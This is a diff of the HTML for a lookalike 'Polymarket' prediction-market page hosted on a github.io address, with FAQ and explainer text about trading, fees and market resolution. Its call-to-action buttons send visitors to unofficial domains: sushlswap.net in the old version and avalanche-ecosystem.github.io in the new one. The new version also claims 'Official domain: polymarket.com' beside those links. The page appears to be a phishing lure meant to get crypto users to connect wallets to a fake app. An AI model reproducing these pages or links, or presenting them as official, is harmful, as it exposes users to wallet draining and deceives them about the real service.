@@ -1,275 +1,47 @@
-<!DOCTYPE html>
-<html dir="ltr" lang="en"><head>
-<meta charset="utf-8"/><meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
-<title>Polymarket — Prediction Market</title>
-<meta content="Polymarket is a non-custodial Prediction Market. Open the app and trade markets from your own wallet." name="description"/>
-<meta content="index,follow,max-image-preview:large" name="robots"/>
-<link href="https://polymarket-site.github.io/" rel="canonical"/>
-<link href="https://polymarket-site.github.io/" hreflang="en" rel="alternate"/><link href="https://polymarket-site.github.io/" hreflang="x-default" rel="alternate"/>
-<meta content="#080A0F" name="theme-color"/>
-<meta content="website" property="og:type"/><meta content="Polymarket — Prediction Market" property="og:title"/><meta content="Polymarket is a non-custodial Prediction Market. Open the app and trade markets from your own wallet." property="og:description"/>
-<meta content="https://polymarket-site.github.io/" property="og:url"/><meta content="https://polymarket-site.github.io/og-cover.png" property="og:image"/><meta content="en" property="og:locale"/>
-<meta content="summary_large_image" name="twitter:card"/><meta content="Polymarket — Prediction Market" name="twitter:title"/><meta content="Polymarket is a non-custodial Prediction Market. Open the app and trade markets from your own wallet." name="twitter:description"/><meta content="https://polymarket-site.github.io/og-cover.png" name="twitter:image"/>
-<link href="favicon.svg" rel="icon" type="image/svg+xml"/><link href="site.webmanifest" rel="manifest"/><link href="static/icon-180.png" rel="apple-touch-icon"/>
-<link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&amp;family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
-<link href="static/style.css" rel="stylesheet"/>
-<script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@graph": [
-    {
-      "@type": "WebSite",
-      "@id": "https://polymarket-site.github.io/#website",
-      "url": "https://polymarket-site.github.io/",
-      "name": "Polymarket"
-    },
-    {
-      "@type": "WebPage",
-      "@id": "https://polymarket-site.github.io/#webpage",
-      "url": "https://polymarket-site.github.io/",
-      "name": "Polymarket — Prediction Market",
-      "description": "Polymarket is a non-custodial Prediction Market. Open the app and trade markets from your own wallet.",
-      "inLanguage": "en",
-      "isPartOf": {
-        "@id": "https://polymarket-site.github.io/#website"
-      }
-    },
-    {
-      "@type": "Organization",
-      "@id": "https://polymarket-site.github.io/#org",
-      "name": "Polymarket",
-      "url": "https://polymarket-site.github.io/",
-      "logo": "https://polymarket-site.github.io/og-cover.png"
-    },
-    {
-      "@type": "WebApplication",
-      "@id": "https://polymarket-site.github.io/#app",
-      "name": "Polymarket",
-      "url": "https://polymarket-site.github.io/",
-      "applicationCategory": "FinanceApplication",
-      "operatingSystem": "Web",
-      "browserRequirements": "Requires JavaScript",
-      "description": "Polymarket is a non-custodial Prediction Market. Open the app and trade markets from your own wallet.",
-      "featureList": [
-        "Prediction Market",
-        "Trade prediction markets"
-      ],
-      "isPartOf": {
-        "@id": "https://polymarket-site.github.io/#website"
-      }
-    },
-    {
-      "@type": "FAQPage",
-      "@id": "https://polymarket-site.github.io/#faq",
-      "inLanguage": "en",
-      "mainEntity": [
-        {
-          "@type": "Question",
-          "name": "Is Polymarket available in the United States?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "For the international Polymarket product, the official geographic restrictions page lists the United States as blocked for order placement. Polymarket US is documented separately as a regulated US event-contract exchange, so US users should use the current official US product and rules rather than trying to bypass restrictions."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "How does Polymarket price outcomes?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Prices come from supply and demand in an order book, not from Polymarket setting odds. The prices and orderbook docs explain that displayed prices represent market-implied probability, but your actual execution depends on bids, asks, spread, and available depth."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Does Polymarket custody my funds?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "The international docs describe Polymarket as non-custodial, with trades settling through smart contracts. That still leaves wallet, signing, interface, and recovery risk. Read Polymarket 101 and use only verified links before connecting a wallet or approving transactions."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What fees should I expect on Polymarket?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Do not assume one fixed fee. Polymarket's fee documentation says taker fees can apply on certain markets and are determined by market category, while other costs can include spread, slippage, funding route charges, and third-party intermediary fees."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "How are Polymarket markets resolved?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Markets resolve according to their predefined rules and a proposal or dispute process. The resolution docs explain how winning tokens can be redeemed after resolution and why traders should read the source, end date, and edge cases before entering a position."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Is Polymarket the same as a sportsbook?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "No. Polymarket is structured around peer-to-peer event contracts and order-book trading rather than house-set lines. The Polymarket US docs make this distinction for the US product, but market, legal, and account rules still matter."
-          }
-        }
-      ]
-    }
-  ]
-}</script></head>
-<body>
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Polymarket - Open App</title><meta name="description" content="polymarket - open the official prediction-market app to browse live odds, trade outcome shares, and verify market rules before acting.">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<link rel="canonical" href="https://polymarket-site.github.io/"><meta name="theme-color" content="#FFFFFF">
+<meta property="og:type" content="website"><meta property="og:title" content="Polymarket - Open App"><meta property="og:description" content="polymarket - open the official prediction-market app to browse live odds, trade outcome shares, and verify market rules before acting.">
+<meta property="og:url" content="https://polymarket-site.github.io/"><meta property="og:image" content="https://polymarket-site.github.io/og-cover.png"><meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Polymarket - Open App"><meta name="twitter:description" content="polymarket - open the official prediction-market app to browse live odds, trade outcome shares, and verify market rules before acting."><meta name="twitter:image" content="https://polymarket-site.github.io/og-cover.png">
+<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
+<link rel="stylesheet" href="static/style.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://polymarket-site.github.io/#website", "url": "https://polymarket-site.github.io/", "name": "Polymarket"}, {"@type": "WebPage", "@id": "https://polymarket-site.github.io/#webpage", "url": "https://polymarket-site.github.io/", "name": "Polymarket - Open App", "description": "polymarket - open the official prediction-market app to browse live odds, trade outcome shares, and verify market rules before acting.", "inLanguage": "en", "isPartOf": {"@id": "https://polymarket-site.github.io/#website"}}, {"@type": "Organization", "@id": "https://polymarket-site.github.io/#org", "name": "Polymarket", "url": "https://polymarket-site.github.io/", "logo": "https://polymarket-site.github.io/og-cover.png", "sameAs": ["https://x.com/Polymarket", "https://defillama.com/protocol/polymarket", "https://docs.polymarket.com/"]}, {"@type": "WebApplication", "@id": "https://polymarket-site.github.io/#app", "name": "Polymarket", "url": "https://polymarket-site.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "polymarket - open the official prediction-market app to browse live odds, trade outcome shares, and verify market rules before acting.", "featureList": ["Official domain: polymarket.com", "Polygon mainnet contracts", "UMA Optimistic Oracle"], "isPartOf": {"@id": "https://polymarket-site.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://polymarket-site.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "Does Polymarket have a token?", "acceptedAnswer": {"@type": "Answer", "text": "Polymarket does not have a public platform token used for ordinary trading. Markets are generally collateralized with USDC, and users should be cautious about fake Polymarket token claims or airdrop links unless they are confirmed through Polymarket's official site or social channels."}}, {"@type": "Question", "name": "What network does Polymarket use?", "acceptedAnswer": {"@type": "Answer", "text": "Polymarket is crypto-native and has used Polygon for market settlement and USDC collateral flows. Users should confirm the network inside the live app before depositing, because sending the wrong USDC version or using the wrong chain can create recovery problems."}}, {"@type": "Question", "name": "How are Polymarket odds calculated?", "acceptedAnswer": {"@type": "Answer", "text": "Polymarket odds come from market prices where traders buy and sell outcome shares. A Yes share trading near 60 cents is often read as roughly 60% implied probability, but spreads, liquidity, fees, and market rules mean it is not a pure forecast or guaranteed probability."}}, {"@type": "Question", "name": "Can U.S. users trade on Polymarket?", "acceptedAnswer": {"@type": "Answer", "text": "Access depends on Polymarket's current terms, jurisdiction rules, and user eligibility checks. Because prediction market rules are regulatory-sensitive and can change, users should rely on the live Polymarket terms and onboarding flow rather than old guides or social posts."}}, {"@type": "Question", "name": "What happens when a Polymarket market resolves?", "acceptedAnswer": {"@type": "Answer", "text": "When a market resolves, winning outcome shares become redeemable according to the market's payout rules and losing shares become worthless. The exact process depends on the market, oracle, and app workflow. Users should keep track of market status and claim or redeem when available."}}, {"@type": "Question", "name": "Why is Polymarket price different from polls?", "acceptedAnswer": {"@type": "Answer", "text": "Polymarket prices reflect traders risking capital, not a direct poll of public opinion. Prices can react to polling, news, liquidity, hedging demand, and trader positioning. A prediction market can disagree with polls because it incorporates different incentives, assumptions, and information sources."}}]}]}</script>
+</head><body>
 <header class="site-header">
-<a aria-label="Polymarket" class="brand" href="#top">
-<svg aria-hidden="true" class="brand-mark" viewbox="0 0 32 32"><defs><lineargradient id="g" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stop-color="#CCDBFB"></stop><stop offset=".5" stop-color="#8EACF2"></stop><stop offset="1" stop-color="#4375EA"></stop></lineargradient></defs><g fill="none" stroke="url(#g)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.4"><circle cx="13" cy="13" r="6.2"></circle><circle cx="20" cy="20" r="6.2"></circle></g></svg>
-<h1>Polymarket</h1>
-</a>
-<nav aria-label="Primary" class="site-nav"><ul class="nav-list"><li><a href="#how-it-works">How it works</a></li><li><a href="#access-and-availability">Access &amp; availability</a></li><li><a href="#fees-security-resolution">Fees security resolution</a></li><li><a href="#core-concepts">Core concepts</a></li><li><a href="#market-areas">Market areas</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-<span class="header-spacer"></span>
-<a class="cta cta-primary header-cta" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Polymarket</a>
-<button aria-expanded="false" aria-label="Menu" class="nav-toggle"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"></path></svg></button>
+  <a class="brand" href="#top" aria-label="Polymarket"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Polymarket</span></a>
+  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
+  <span class="header-spacer"></span>
+  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
+  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
 </header>
 <main id="top">
-<section class="hero"><div class="container"><div class="hero-grid">
-<div class="hero-copy">
-<h2 class="hero-title">Trade prediction markets</h2>
-<p class="lead">A practical guide to <strong>Polymarket</strong> prediction markets, pricing, access rules, fees, and resolution risk.</p>
-<div class="hero-cta-row"><a class="cta cta-primary" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Polymarket ↗</a><a class="cta cta-secondary" href="#what-is">Learn more</a></div>
-<p class="hero-note">Live preview — open Polymarket to trade.</p><div class="trust-row"><span class="trust-chip">On-chain</span><span class="trust-chip">Non-custodial</span></div>
-</div>
-<div class="hero-widget">
-<div aria-hidden="true" class="floating-coins"></div>
-<div class="swap-widget" id="app-widget">
-<div class="swap-widget-head"><span>Trade</span><span class="badge">Market</span></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">From</span><span class="swap-amount">1.00</span></div><span class="token-chip" data-slot="from"><span class="token-icon-morph"><img alt="USDC" class="" decoding="async" height="28" loading="lazy" src="usdc.png" width="28"/></span><span class="token-ticker">USDC</span></span></div>
-<div class="swap-flip-wrap"><button aria-label="Switch" class="swap-flip" type="button"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24"><path d="M7 4v16M7 20l-3-3M7 4l3 3M17 20V4M17 4l3 3M17 20l-3-3"></path></svg></button></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">To</span><span class="swap-amount">~1.00</span></div><span class="token-chip" data-slot="to"><span class="token-icon-morph"><span aria-hidden="true" class="coin-fallback">YES</span></span><span class="token-ticker">YES</span></span></div>
-<a class="cta cta-primary swap-now-main" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Polymarket ↗</a>
-<p class="swap-note">Preview — open Polymarket to trade.</p>
-</div>
-</div>
-</div></div></section>
-<section class="section section-alt" id="what-is"><div class="container"><h2>What is Polymarket?</h2><div class="capsule"><strong>Polymarket</strong> is a prediction market platform where users trade outcome shares on real-world events instead of trading against a house. The international product uses crypto rails, an order book, and onchain settlement, while Polymarket US is documented separately as a regulated event-contract exchange. The <a href="https://docs.polymarket.com/polymarket-101" rel="noopener noreferrer">official Polymarket 101</a> page is the best starting point for how markets, custody, and settlement fit together.</div></div></section>
-<section class="section section-alt" id="how-it-works">
-<div class="container"><h2>How Polymarket works</h2><p class="section-intro">Polymarket markets ask outcome-based questions, and traders buy or sell shares that reflect market-implied probability. The exact result depends on live liquidity, order type, and final resolution rules.</p>
-<ol class="steps"><li><strong>Read the market question</strong><span>Start with the title, then read the rules, source, end condition, and edge cases before treating the price as meaningful.</span></li><li><strong>Check the order book</strong><span>Prices come from bids and asks. A displayed probability may differ from the price you actually pay or receive.</span></li><li><strong>Place or exit an order</strong><span>Users can buy, sell, or close positions before settlement when liquidity is available and access rules permit trading.</span></li><li><strong>Wait for resolution</strong><span>Winning outcome tokens can be redeemed after the market resolves; losing outcome tokens have no redemption value.</span></li></ol>
-</div>
-</section>
-<section class="section" id="access-and-availability">
-<div class="container"><h2>Access and availability</h2><p class="section-intro">Polymarket access is not the same everywhere. Always check the current product, jurisdiction rules, and account requirements before attempting to trade.</p>
-<div class="cards three"><article class="card"><h3>International access</h3><p>Polymarket's international docs list geographic restrictions and state that orders from blocked regions are rejected. The <a href="https://docs.polymarket.com/api-reference/geoblock" rel="noopener noreferrer">geoblock page</a> currently includes the United States among blocked countries for the international product.</p></article><article class="card"><h3>Polymarket US</h3><p>Polymarket US is described in its own <a href="https://docs.polymarket.us/getting-started/what-is-polymarket-us" rel="noopener noreferrer">official docs</a> as a fiat-based, CFTC-regulated event-contract exchange for US residents. Treat it as a separate product with separate rules.</p></article><article class="card"><h3>Regulatory context</h3><p>The CFTC previously announced an enforcement settlement involving Polymarket's unregistered event markets. The <a href="https://www.cftc.gov/PressRoom/PressReleases/8478-22" rel="noopener noreferrer">CFTC release</a> is useful background, but current availability should be checked from official Polymarket sources.</p></article></div>
-</div>
-</section>
-<section class="section section-alt" id="fees-security-resolution">
-<div class="container"><h2>Fees, security, and resolution</h2><p class="section-intro">Costs and risk are best read as components: trading fees where enabled, spread, slippage, funding route costs, wallet risk, and resolution uncertainty.</p>
-<div class="cards three"><article class="card"><h3>Fee components</h3><p>Polymarket says taker fees can apply on certain markets, while makers are not charged trading fees. Review the <a href="https://docs.polymarket.com/trading/fees" rel="noopener noreferrer">fee docs</a> for the current market category rather than assuming one fixed cost.</p></article><article class="card"><h3>Self-custody risk</h3><p>The international docs describe a non-custodial model, so wallet access and private-key handling matter. Losing key access, signing a bad transaction, or using an unverified interface can still lead to fund loss.</p></article><article class="card"><h3>Resolution risk</h3><p>Resolution depends on the market's rules and oracle process. Polymarket's <a href="https://docs.polymarket.com/concepts/resolution" rel="noopener noreferrer">resolution docs</a> explain proposals, disputes, and redemptions, so read the rules before sizing a position.</p></article></div>
-</div>
-</section>
-<section class="section" id="core-concepts">
-<div class="container">
-<h2>Core Polymarket Concepts</h2>
-<p class="section-intro">These are the pieces to understand before interpreting a price or opening a position.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">YES</span>
-<div><h3>Yes Shares</h3><p class="coin-sub">Pays if the event happens <span class="tag">Outcome</span></p></div>
-</div>
-<p class="coin-intent">A Yes share expresses the view that the market outcome will occur. The trade can still lose if the market resolves against that outcome.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="YES" href="https://docs.polymarket.com/concepts/positions-tokens" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">NO</span>
-<div><h3>No Shares</h3><p class="coin-sub">Pays if the event does not happen <span class="tag">Outcome</span></p></div>
-</div>
-<p class="coin-intent">A No share is the opposite side of the event question. Its price can move sharply when new information changes the market view.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="NO" href="https://docs.polymarket.com/concepts/positions-tokens" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">CLOB</span>
-<div><h3>Order Book</h3><p class="coin-sub">Peer-to-peer bids and asks <span class="tag">Pricing</span></p></div>
-</div>
-<p class="coin-intent">Polymarket uses an order book, so spread and depth matter. Thin books can make small-looking trades execute at worse prices.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="CLOB" href="https://docs.polymarket.com/concepts/prices-orderbook" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">RULES</span>
-<div><h3>Market Rules</h3><p class="coin-sub">Source, date, and edge cases <span class="tag">Read</span></p></div>
-</div>
-<p class="coin-intent">The title is not enough. Rules define what counts, which source is used, and how ambiguous outcomes should be handled.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="RULES" href="https://docs.polymarket.com/concepts/resolution" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">pUSD</span>
-<div><h3>pUSD</h3><p class="coin-sub">Collateral in the docs <span class="tag">Funds</span></p></div>
-</div>
-<p class="coin-intent">Polymarket's newer docs refer to pUSD as collateral for outcome pairs. Confirm the exact funding and withdrawal route in the interface you use.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="pUSD" href="https://docs.polymarket.com/polymarket-101" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="UMA" class="coin-icon" decoding="async" height="40" loading="lazy" src="uma.png" width="40"/>
-<div><h3>UMA Oracle</h3><p class="coin-sub">Resolution proposal process <span class="tag">Oracle</span></p></div>
-</div>
-<p class="coin-intent">The oracle process can include proposals and disputes. That process helps settle markets, but it does not remove rule or interpretation risk.</p>
-<a class="cta cta-mini swap-now" data-icon="uma.png" data-ticker="UMA" href="https://docs.polymarket.com/concepts/resolution" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section section-alt" id="market-areas">
-<div class="container">
-<h2>Common Market Areas</h2>
-<p class="section-intro">Polymarket markets change over time, but these categories show the kinds of questions users often analyze.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><img alt="POL" class="coin-icon" decoding="async" height="40" loading="lazy" src="pol.png" width="40"/>
-<div><h3>Politics</h3><p class="coin-sub">Elections and policy outcomes <span class="tag">Event</span></p></div>
-</div>
-<p class="coin-intent">Political markets can be highly sensitive to wording, source selection, and late news. Read the rules before treating a price as a forecast.</p>
-<a class="cta cta-mini swap-now" data-icon="pol.png" data-ticker="POL" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">CRYPTO</span>
-<div><h3>Crypto</h3><p class="coin-sub">Token and market milestones <span class="tag">Asset</span></p></div>
-</div>
-<p class="coin-intent">Crypto markets may reference prices, launches, listings, or protocol events. Verify the data source named in the specific market.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="CRYPTO" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">SPORT</span>
-<div><h3>Sports</h3><p class="coin-sub">Games, seasons, and records <span class="tag">Event</span></p></div>
-</div>
-<p class="coin-intent">Sports markets can have lineup, injury, start-time, and settlement nuances. Open orders may need special attention around game start.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="SPORT" href="https://docs.polymarket.com/concepts/markets-events" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">ECON</span>
-<div><h3>Economics</h3><p class="coin-sub">Macro releases and rates <span class="tag">Macro</span></p></div>
-</div>
-<p class="coin-intent">Economic markets often hinge on an official release or defined measurement. The source and timing are part of the trade.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="ECON" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">CULT</span>
-<div><h3>Culture</h3><p class="coin-sub">Media and public events <span class="tag">Event</span></p></div>
-</div>
-<p class="coin-intent">Culture markets can look simple but hide definition risk. Watch for precise wording around nominees, releases, appearances, or awards.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="CULT" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section" id="compare"><div class="container"><h2>Polymarket International vs. Polymarket US</h2><p class="section-intro">Polymarket documents two distinct products: the international crypto-based product and <a href="https://docs.polymarket.us/getting-started/what-is-polymarket-us" rel="noopener noreferrer">Polymarket US</a>. Access, collateral, and regulation should be checked product by product.</p>
-<div class="table-wrap"><table class="compare-table"><thead><tr><th>Area</th><th>International</th><th>Polymarket US</th></tr></thead><tbody><tr><td>Primary rail</td><td>Crypto-based product using blockchain settlement.</td><td>Fiat-based event-contract exchange.</td></tr><tr><td>US access</td><td>US order placement is listed as blocked in the international geoblock docs.</td><td>Built for US residents under the product's stated rules.</td></tr><tr><td>Regulatory posture</td><td>Subject to geographic restrictions and international availability rules.</td><td>Described as operating under CFTC oversight.</td></tr><tr><td>What to verify</td><td>Wallet, market rules, collateral route, and geoblock status.</td><td>Account eligibility, market availability, deposits, and exchange rules.</td></tr></tbody></table></div></div></section>
-<section class="section" id="faq"><div class="container"><h2>Polymarket FAQ</h2><div class="faq-list">
-<details open=""><summary><h3>Is Polymarket available in the United States?</h3></summary><div>For the international Polymarket product, the official <a href="https://docs.polymarket.com/api-reference/geoblock" rel="noopener noreferrer">geographic restrictions</a> page lists the United States as blocked for order placement. Polymarket US is documented separately as a regulated US event-contract exchange, so US users should use the current official US product and rules rather than trying to bypass restrictions.</div></details>
-<details open=""><summary><h3>How does Polymarket price outcomes?</h3></summary><div>Prices come from supply and demand in an order book, not from Polymarket setting odds. The <a href="https://docs.polymarket.com/concepts/prices-orderbook" rel="noopener noreferrer">prices and orderbook docs</a> explain that displayed prices represent market-implied probability, but your actual execution depends on bids, asks, spread, and available depth.</div></details>
-<details><summary><h3>Does Polymarket custody my funds?</h3></summary><div>The international docs describe Polymarket as non-custodial, with trades settling through smart contracts. That still leaves wallet, signing, interface, and recovery risk. Read <a href="https://docs.polymarket.com/polymarket-101" rel="noopener noreferrer">Polymarket 101</a> and use only verified links before connecting a wallet or approving transactions.</div></details>
-<details><summary><h3>What fees should I expect on Polymarket?</h3></summary><div>Do not assume one fixed fee. Polymarket's <a href="https://docs.polymarket.com/trading/fees" rel="noopener noreferrer">fee documentation</a> says taker fees can apply on certain markets and are determined by market category, while other costs can include spread, slippage, funding route charges, and third-party intermediary fees.</div></details>
-<details><summary><h3>How are Polymarket markets resolved?</h3></summary><div>Markets resolve according to their predefined rules and a proposal or dispute process. The <a href="https://docs.polymarket.com/concepts/resolution" rel="noopener noreferrer">resolution docs</a> explain how winning tokens can be redeemed after resolution and why traders should read the source, end date, and edge cases before entering a position.</div></details>
-<details><summary><h3>Is Polymarket the same as a sportsbook?</h3></summary><div>No. Polymarket is structured around peer-to-peer event contracts and order-book trading rather than house-set lines. The <a href="https://docs.polymarket.us/getting-started/what-is-polymarket-us" rel="noopener noreferrer">Polymarket US docs</a> make this distinction for the US product, but market, legal, and account rules still matter.</div></details>
-</div></div></section>
+  <section class="hero">
+    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
+    <div class="container">
+      <h1>Polymarket</h1>
+      <div class="appcard"><div class="appcard-head"><img src="favicon.png" alt="" width="40" height="40"><b>Polymarket</b><span class="badge">Prediction Market</span></div><div class="appcard-chips"><span><b>Category</b> Prediction market</span><span><b>Network</b> Polygon</span><span><b>Token</b> USDC collateral; no public Polymarket token</span><span><b>Custody</b> Wallet and market contracts</span></div><a class="btn btn-dark" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Polymarket App ↗</a></div>
+      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Polymarket ↗</a></div>
+      <p class="hero-note">Live preview — open the official Polymarket app from your own wallet.</p>
+      <div class="trust-row"><span class="trust-chip">Official domain: polymarket.com</span><span class="trust-chip">Polygon mainnet contracts</span><span class="trust-chip">UMA Optimistic Oracle</span></div>
+    </div>
+  </section>
+  <section class="section" id="about"><div class="container"><h2>What is Polymarket?</h2><div class="capsule"><strong>Polymarket</strong> is a prediction-market app for trading event outcomes, with an international CLOB that matches orders offchain and settles matched trades on Polygon. Its <a href="https://docs.polymarket.com/trading/overview">official trading docs</a> describe <a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-712" rel="noopener noreferrer">EIP-712 signed orders</a>, <a class="inline-link" href="https://academy.binance.com/en/glossary/non-custodial" rel="noopener noreferrer">non-custodial trading</a>, and onchain settlement.</div></div></section>
+  <section class="section" id="facts"><div class="container"><h2>Polymarket at a glance</h2><div class="facts"><div class="f"><small>Category</small><b><a class="inline-link" href="https://www.investopedia.com/terms/p/prediction_market.asp" rel="noopener noreferrer">Prediction market</a></b></div><div class="f"><small>Network</small><b>Polygon</b></div><div class="f"><small>Token</small><b><a class="inline-link" href="https://www.coingecko.com/en/coins/usd-coin" rel="noopener noreferrer">USDC collateral</a>; no public Polymarket token</b></div><div class="f"><small>Custody</small><b>Wallet and market contracts</b></div></div></div></section>
+  <section class="section section-alt"><div class="container"><h2>How Polymarket works with USDC on Polygon</h2><div class="intent-a">Polymarket is a prediction market where users buy and sell outcome shares tied to real-world events. Markets are typically collateralized with USDC on Polygon, and prices can be read as <a class="inline-link" href="https://www.investopedia.com/terms/i/implied_probability.asp" rel="noopener noreferrer">market-implied probabilities</a> before fees, spreads, and liquidity effects. A share that resolves correctly pays out according to the market rules; an incorrect outcome becomes worthless. Users searching how Polymarket works should focus on the market question, resolution source, end date, order book liquidity, and whether the outcome wording matches their intended view.</div></div></section><section class="section"><div class="container"><h2>Polymarket fees, spreads, and liquidity</h2><div class="intent-a">Polymarket trading costs are not only explicit fees. The practical cost is often the <a class="inline-link" href="https://academy.binance.com/en/glossary/bid-ask-spread" rel="noopener noreferrer">bid-ask spread</a>, market depth, <a class="inline-link" href="https://www.coingecko.com/learn/what-is-slippage-in-crypto" rel="noopener noreferrer">price impact</a>, and any funding or withdrawal cost for getting USDC onto Polygon. Liquid markets such as major politics, sports, crypto, or macro events usually have tighter spreads than niche markets. Before buying a large position, users should inspect the order book, available shares at each price, potential slippage, and rules for resolution. A market showing high volume can still have thin liquidity at the exact price a user wants.</div></div></section><section class="section section-alt"><div class="container"><h2>Polymarket withdrawals and deposits</h2><div class="intent-a">Polymarket deposits and withdrawals revolve around supported wallet and USDC flows on Polygon or integrated funding methods offered in the app. Users should verify the exact chain and token before sending funds, because USDC exists on multiple networks and not every deposit address or payment method accepts every version. Withdrawal timing depends on the selected rail, wallet transaction confirmation, and any compliance or account checks required by the app. For <a class="inline-link" href="https://www.gemini.com/cryptopedia/non-custodial-wallets" rel="noopener noreferrer">self-custody flows</a>, keeping POL or the required gas token available can prevent stuck wallet transactions.</div></div></section><section class="section"><div class="container"><h2>Polymarket market resolution and disputes</h2><div class="intent-a">Polymarket markets resolve according to their written rules, <a class="inline-link" href="https://docs.polymarket.com/concepts/positions-tokens" rel="noopener noreferrer">resolution source</a>, and oracle or dispute process. Searchers often ask because the headline question can feel obvious while the fine print defines the actual outcome. Before trading, read the rules for time zone, source hierarchy, ambiguous cases, and cancellation conditions. A market can be controversial if news develops after close, if a source revises information, or if the wording excludes a scenario users assumed was included. The market description is more important than social-media interpretation.</div></div></section>
